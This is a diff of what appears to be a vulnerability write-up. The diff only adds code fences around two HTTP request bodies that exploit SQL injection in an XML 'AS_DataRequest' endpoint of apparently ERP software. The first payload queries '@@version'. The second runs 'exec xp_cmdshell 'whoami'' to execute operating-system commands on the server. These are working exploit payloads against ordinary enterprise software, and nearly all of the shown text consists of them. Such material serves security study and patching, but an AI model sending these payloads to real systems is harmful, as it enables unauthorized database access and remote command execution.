@@ -78,7 +78,9 @@ Connection: close
 Content-Type: application/x-www-form-urlencoded  
 Content-Length: 386  
    
+```text
 cVer=9.8.0&dp=<?xml version="1.0"encoding="GB2312"?><R9PACKETversion="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">select@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbgr0vic8FYm8C9QZdqicv9JyG0kPwQXNZZ4TgXr9GQ8icUmuNJ6YH4Zl9g/640?wx_fmt=png)
 
@@ -131,7 +133,9 @@ Connection: close
 Content-Type: application/x-www-form-urlencoded  
 Content-Length: 357  
    
+```text
 cVer=9.8.0&dp=<?xml version="1.0"encoding="GB2312"?><R9PACKETversion="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">exec xp_cmdshell'whoami'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbONyrHibCbaWKhZTSGp4t5Bkg9libyIAATqxjd3zMb8R2sf9bHUspjkdA/640?wx_fmt=png)
 
